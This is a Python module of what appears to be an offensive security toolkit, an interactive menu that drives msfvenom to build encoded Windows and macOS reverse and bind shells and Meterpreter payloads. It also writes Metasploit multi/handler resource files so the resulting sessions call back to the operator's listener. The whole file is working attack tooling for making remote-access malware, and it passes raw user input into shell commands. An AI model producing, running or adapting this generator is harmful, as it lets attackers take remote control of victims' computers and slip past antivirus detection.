#! /usr/bin/env python3

##MSVenom Basic Payloads

import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()
customfolder = m.loc + "/aMALgamation/current/VenomCustom/"
if not os.path.exists(customfolder):
    os.makedirs(customfolder)

##  32 bit MSFVenom MeterpreterShell
def venom():
    os.system("clear")
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\t***MALWARE TIME!!!!!***\n\n" + m.bcolors.ENDC)

    print(
        m.bcolors.GREEN + m.bcolors.BOLD + "\tAll payloads and RC files will be put in:" + customfolder + m.bcolors.ENDC)
    while (1):
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)
        print(m.bcolors.BOLD + m.bcolors.GREEN + """
        *******************************************************************
          _   _   _   _   _   _   _   _     _   _   _   _  
         / \ / \ / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ 
        ( M | S | F | V | e | n | o | m ) ( M | e | n | u )
         \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 
          """ + m.bcolors.ENDC)

        print(
            m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
        print("\t(1)\tGenerate Windows 32bit payload")
        print("\t(2)\tGenerate Windows 64bit payload")
        print("\t(3)\tGenerate Mac 32bit Payload")
        print("\t(4)\tGenerate Mac 64bit Payload")
        print("\t(5)\tGenerate Custom Payload")
        print(m.bcolors.ERROR + m.bcolors.BOLD + "\t****If you are using this section then you should know what you want. I will try to help, BUT you must not be a NOOB!!" + m.bcolors.ENDC)
        print("\t(99)\tGo back to the Custom Malware Menu")
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)

        options = input("\nW4@+ Ma1w@r3 R U W@^t1ng Brobi-Wan: ")
        if options == "1":
           gen_win32()
        elif options == "2":
           gen_win64()
        elif options == "3":
           gen_mac32()
        elif options == "4":
           gen_mac64()
        elif options == "5":
           custom()
        elif options == "99":
           os.system("clear")
           break
        else:
           input("You must be a Pats Fan! Come on pick something... ")


def gen_win32():
    global customfolder
    payload = "null"
    a = "windows/shell/bind_tcp"
    b = "windows/shell/reverse_tcp"
    c = "windows/shell/reverse_tcp_dns"
    d = "windows/shell/reverse_udp"
    e = "windows/shell_bind_tcp"
    f = "windows/shell_reverse_tcp"
    a1 = "windows/meterpreter/bind_tcp"
    b1 = "windows/meterpreter/reverse_http"
    c1 = "windows/meterpreter/reverse_https"
    d1 = "windows/meterpreter/reverse_tcp"
    e1 = "windows/meterpreter/reverse_tcp_dns"
    a2 = "windows/meterpreter_bind_tcp"
    b2 = "windows/meterpreter_reverse_http"
    c2 = "windows/meterpreter_reverse_https"
    e3 = "windows/meterpreter_reverse_tcp"
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
    print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
    print("""
   Best Payloads to use
    (a) ---%s
    (b) ---%s
    (c) ---%s
    (d) ---%s
    (e) ---%s
    (f) ---%s
    (a1)---%s
    (b1)---%s
    (c1)---%s
    (d1)---%s
    (e1)---%s
    (a2)---%s
    (b2)---%s
    (c2)---%s
    (e3)---%s

  """ %(a, b, c, d, e, f, a1, b1, c1, d1, e1, a2, b2, c2, e3))

    if (payload == "null"):
        print(
            "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for windows/shell/bind_tcp\n")
        payload = input("\tEnter payload type:  ") or e3
        if payload == 'a':
           payload = a
        elif payload == 'b':
            payload = b
        elif payload == 'c':
            payload = c
        elif payload == 'd':
            payload = d
        elif payload == 'e':
            payload = e
        elif payload == 'f':
            payload = f
        elif payload == 'a1':
            payload = a1
        elif payload == 'b1':
            payload = b1
        elif payload == 'c1':
            payload = c1
        elif payload == 'd1':
            payload = d1
        elif payload == 'e1':
            payload = e1
        elif payload == 'a2':
            payload = a2
        elif payload == 'b2':
            payload = b2
        elif payload == 'c2':
            payload = c2
        elif payload == 'e3':
            payload = e3
        else:
           print(m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE +"\t********Invalid payload***********" + m.bcolors.ENDC)
    print("\tYour Payload is: %s" %(payload))
    port = input("\tWhat Port are you wanting to use?:")
    filename = input("\tWhat is the name of your file?:")
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 32bit Meterpreter Payloads NOW!" + m.bcolors.ENDC)
    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 32bit MSFVenom Files Named:" + filename)
    os.system(
        "msfvenom -p " + payload + " LHOST=" + m.listener_ip + " LPORT=" + port + " --platform win -a x86 -e x86/shikata_ga_nai -f exe >" + customfolder + filename + ".exe")

    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
    msf_resource_file = open(customfolder + filename + ".rc", "w")
    msf_resource_file.write("""use multi/handler
set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j
""" % (payload, m.listener_ip, port))


##  64 bit MSFVenom MeterpreterShell
def gen_win64():
    global customfolder
    payload = "null"
    a = "windows/x64/shell/bind_tcp"
    b = "windows/x64/shell/reverse_tcp"
    c = "windows/x64/shell_bind_tcp"
    d = "windows/x64/shell_reverse_tcp"

    a1 = "windows/x64/meterpreter/bind_tcp"
    b1 = "windows/x64/meterpreter/reverse_http"
    c1 = "windows/x64/meterpreter/reverse_https"
    d1 = "windows/x64/meterpreter/reverse_tcp"

    a2 = "windows/x64/meterpreter_bind_tcp"
    b2 = "windows/x64/meterpreter_reverse_http"
    c2 = "windows/x64/meterpreter_reverse_https"
    e3 = "windows/x64/meterpreter_reverse_tcp"
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
    print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
    print("""
     Best Payloads to use
      (a) ---%s
      (b) ---%s
      (c) ---%s
      (d) ---%s
      (a1)---%s
      (b1)---%s
      (c1)---%s
      (d1)---%s
      (a2)---%s
      (b2)---%s
      (c2)---%s
      (e3)---%s

    """ % (a, b, c, d, a1, b1, c1, d1, a2, b2, c2, e3))

    if (payload == "null"):
        print(
            "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for windows/shell/bind_tcp\n")
        payload = input("\tEnter payload type:  ") or e3
        if payload == 'a':
            payload = a
        elif payload == 'b':
            payload = b
        elif payload == 'c':
            payload = c
        elif payload == 'd':
            payload = d
        elif payload == 'a1':
            payload = a1
        elif payload == 'b1':
            payload = b1
        elif payload == 'c1':
            payload = c1
        elif payload == 'd1':
            payload = d1
        elif payload == 'a2':
            payload = a2
        elif payload == 'b2':
            payload = b2
        elif payload == 'c2':
            payload = c2
        elif payload == 'e3':
            payload = e3
        else:
            print(m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE +"\t********Invalid payload***********" + m.bcolors.ENDC)
    print("\tYour Payload is: %s" % (payload))
    port = input("\tWhat Port are you wanting to use?:")
    filename = input("\tWhat is the name of your file?:")
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 64bit Meterpreter Payloads NOW!" + m.bcolors.ENDC)
    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 64bit MSFVenom Files Named:" + filename)
    os.system(
        "msfvenom -p " + payload + " LHOST=" + m.listener_ip + " LPORT=" + port + " --platform win -a x64 -e  x64/xor -i 3 -f exe >" + customfolder + filename +".exe")

    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
    msf_resource_file = open(customfolder + filename + ".rc", "w")
    msf_resource_file.write("""use multi/handler
    set payload %s
    set LHOST %s
    set LPORT %s
    set ExitOnSession false
    exploit -j
    """ % (payload, m.listener_ip, port))


##  32 bit MAC  MSFVenom  MeterpreterShell
def gen_mac32():
    global customfolder
    payload = "null"
    a = "osx/x86/shell_bind_tcp"
    b = "osx/x86/shell_reverse_tcp"
    c = "osx/x86/vforkshell/bind_tcp"
    d = "osx/x86/vforkshell/reverse_tcp"
    e = "osx/x86/vforkshell_bind_tcp"
    f = "osx/x86/vforkshell_reverse_tcp"

    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
    print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
    print("""
     Best Payloads to use
      (a) ---%s
      (b) ---%s
      (c) ---%s
      (d) ---%s
      (e) ---%s
      (f) ---%s


    """ % (a, b, c, d, e, f))

    if (payload == "null"):
        print(
            "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for windows/shell/bind_tcp\n")
        payload = input("\tEnter payload type:  ") or a
        if payload == 'a':
            payload = a
        elif payload == 'b':
            payload = b
        elif payload == 'c':
            payload = c
        elif payload == 'd':
            payload = d
        elif payload == 'e':
            payload = e
        elif payload == 'f':
            payload = f
        else:
            print(m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE +"\t********Invalid payload***********" + m.bcolors.ENDC)
    print("\tYour Payload is: %s" % (payload))
    port = input("\tWhat Port are you wanting to use?:")
    filename = input("\tWhat is the name of your file?:")
    print(
        m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating OSX 32bit  Payloads NOW!" + m.bcolors.ENDC)
    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating  32bit OSX MSFVenom Files Named:" + filename)
    os.system(
        "msfvenom -p " + payload + " LHOST=" + m.listener_ip + " LPORT=" + port + " --platform OSX -a x86  -f macho  >" + customfolder + filename +".macho")

    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
    msf_resource_file = open(customfolder + filename + ".rc", "w")
    msf_resource_file.write("""use multi/handler
    set payload %s
    set LHOST %s
    set LPORT %s
    set ExitOnSession false
    exploit -j
    """ % (payload, m.listener_ip, port))



##  64 bit MAC  MSFVenom  MeterpreterShell
def gen_mac64():

    global customfolder
    payload = "null"
    a = "osx/x64/shell_bind_tcp"
    b = "osx/x64/shell_reverse_tcp"
    c = "osx/x64/meterpreter/bind_tcp"
    d = "osx/x64/meterpreter/reverse_tcp"
    e = "osx/x64/meterpreter_reverse_http"
    f = "osx/x64/meterpreter_reverse_https"
    g = "osx/x64/meterpreter_reverse_tcp"

    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
    print(
         m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
    print("""
     Best Payloads to use
      (a) ---%s
      (b) ---%s
      (c) ---%s
      (d) ---%s
      (e) ---%s
      (f) ---%s
      (g) ---%s


     """ % (a, b, c, d, e, f, g))

    if (payload == "null"):
        print(
            "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for windows/shell/bind_tcp\n")
        payload = input("\tEnter payload type:  ") or a
        if payload == 'a':
            payload = a
        elif payload == 'b':
            payload = b
        elif payload == 'c':
            payload = c
        elif payload == 'd':
            payload = d
        elif payload == 'e':
            payload = e
        elif payload == 'f':
            payload = f
        elif payload == 'g':
            payload = g
        else:
            print(
                m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\t********Invalid payload***********" + m.bcolors.ENDC)
    print("\tYour Payload is: %s" % (payload))
    port = input("\tWhat Port are you wanting to use?:")
    filename = input("\tWhat is the name of your file?:")
    print(
        m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating OSX 64bit  Payloads NOW!" + m.bcolors.ENDC)
    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating  64bit OSX MSFVenom Files Named:" + filename)
    os.system(
        "msfvenom -p " + payload + " LHOST=" + m.listener_ip + " LPORT=" + port + " --platform OSX -a x64  -f macho  >" + customfolder + filename +".macho")

    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
    msf_resource_file = open(customfolder + filename + ".rc", "w")
    msf_resource_file.write("""use multi/handler
    set payload %s
    set LHOST %s
    set LPORT %s
    set ExitOnSession false
    exploit -j
    """ % (payload, m.listener_ip, port))

def custom():

    r = "raw"
    format = "null"

    print(m.bcolors.GREEN + m.bcolors.BOLD +  "\tGenerating Custom MSFVenom payloads... Please bear with me." + m.bcolors.ENDC)
    type = input("\tWhat type of Payload? (Example: php, java, etc..):")
    print(m.bcolors.BOLD +  "\tWe are listing the possible payloads!!!" + m.bcolors.ENDC)
    os.system("msfvenom -l payload | grep %s/ | cut -d ' ' -f 5" %(type))
    print("\n\tYou are going to want to copy the payload that you are wanting and put it into the below field!\n")
    payload = input("\tWhat payload are you wanting to use?:")
    print(m.bcolors.BOLD +  "\tWe are listing the possible Formats!!!" + m.bcolors.ENDC)
    os.system("msfvenom -l formats")


    if (format == "null"):
        print(
            "\n\tYou can pick a format here. If you do not pick one it will default to raw. Also if you do not know which to pick, then pick raw.\n")
        format = input("\tWhat format are you wanting to use?:") or r

        print(
            "\n\n\tHere you are going to want to put what type of extension that you are going to want on your payload.\n\tRemember that this should go with the format that you are using.\n")
    extension = input("\tWhat file extension do you want to use?:")

    port = input("\tWhat Port are you wanting to use?:")
    filename = input("\tWhat is the name of your file?:")
    print(
        m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating " + type + "  Payloads NOW!" + m.bcolors.ENDC)
    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSFVenom Files Named:" + filename)
    os.system(
        "msfvenom -p " + payload + " LHOST=" + m.listener_ip + " LPORT=" + port + "  -f" + format +  " >" + customfolder + filename +"." + extension)

    print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
    msf_resource_file = open(customfolder + filename + ".rc", "w")
    msf_resource_file.write("""use multi/handler
    set payload %s
    set LHOST %s
    set LPORT %s
    set ExitOnSession false
    exploit -j
    """ % (payload, m.listener_ip, port))
    print(m.bcolors.BLUE + m.bcolors.BOLD + "Well... I hope your payload was generated... If there was an issue maybe you should just try one that I did for you.... Thanks!\n\n\n" + m.bcolors.ENDC)
